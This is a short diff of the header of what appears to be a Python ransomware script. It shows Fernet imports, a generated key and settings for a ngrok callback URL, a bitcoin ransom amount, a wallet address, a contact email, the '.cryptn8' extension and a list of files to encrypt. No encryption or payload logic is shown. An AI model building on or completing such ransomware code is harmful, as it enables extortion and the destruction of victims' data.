@@ -1,7 +1,5 @@
 # imports
 
-import subprocess
-import sys
 import os
 from cryptography.fernet import Fernet
 import random
@@ -25,11 +23,11 @@ uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "")
 
 # some GLOBALS
 
-URL = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
-BTC_AMOUNT = 0.03                                       # <----  REQUIRED
-BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
-EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
-EXT = ".cryptn8"                                        # <----  OPTIONAL
+URL = ""                        # <----  REQUIRED
+BTC_AMOUNT = ""                 # <----  REQUIRED
+BTC_WALLET = ""                 # <----  REQUIRED
+EMAIL = ""                      # <----  REQUIRED
+EXT = ".cryptn8"                # <----  OPTIONAL
 
 
 fileLists = []      # stores the files to be encrypted
